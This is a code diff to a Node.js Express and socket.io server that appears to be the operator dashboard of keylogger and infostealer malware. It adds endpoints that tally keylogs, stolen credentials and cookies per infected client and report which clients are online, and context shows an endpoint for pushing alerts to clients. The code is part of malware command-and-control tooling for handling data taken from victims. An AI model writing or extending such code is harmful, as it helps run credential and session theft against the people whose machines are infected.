@@ -8,8 +8,10 @@ const { Server } = require("socket.io");
 /**
  *
  * @param {express.Express} appWebUI
+ * @param {import("http").Server} server
  */
 module.exports = function initializeWebUiApi(appWebUI, server) {
+  const wakeUpTime = new Date();
   const io = new Server(server, {
     cors: {
       origin: "http://localhost:5173",
@@ -23,20 +25,17 @@ module.exports = function initializeWebUiApi(appWebUI, server) {
       origin: "http://localhost:5173", // allow only this origin
     })
   );
-  appWebUI.get("/clients", (req, res) => {
-    const onlineClients = Object.keys(socketMaps);
+  appWebUI.get("/statistics", (req, res) => {
     const stmt = db.prepare(
       `
-      SELECT * FROM clients
-      `
+      SELECT 
+        (SELECT COUNT(*) FROM clients) as clients,
+        (SELECT COUNT(*) FROM keylogs) as keylogs,
+        (SELECT COUNT(*) FROM credentials) as credentials,
+        (SELECT COUNT(*) FROM cookies) as cookies
+    `
     );
-    const clients = stmt.all();
-    // add online property to each client with an id in onlineClients
-    clients.forEach((client) => {
-      client.online = onlineClients.includes(client.client_id);
-    });
-
-    res.json(clients);
+    res.json({ wakeUpTime: wakeUpTime.getTime(), ...stmt.get() });
   });
   appWebUI.post("/alert", (req, res) => {
     const { client_id, message } = req.body;
@@ -97,6 +96,23 @@ module.exports = function initializeWebUiApi(appWebUI, server) {
     );
     const keylogs = stmt.all(client_id);
     res.json(keylogs);
+  });
+  appWebUI.get("/clients", (req, res) => {
+    const stmt = db.prepare(`
+      SELECT 
+        c.*,
+        (SELECT COUNT(*) FROM keylogs WHERE client_id = c.client_id) as keylogs,
+        (SELECT COUNT(*) FROM credentials WHERE client_id = c.client_id) as credentials,
+        (SELECT COUNT(*) FROM cookies WHERE client_id = c.client_id) as cookies
+      FROM clients c
+    `);
+
+    const statistics = stmt.all().map((client) => ({
+      ...client,
+      online: Object.keys(socketMaps).includes(client.client_id),
+    }));
+
+    res.json(statistics);
   });
   appWebUI.get("/*", (req, res) => {
     res.sendFile(path.join(__dirname, "../webui/dist", "index.html"));
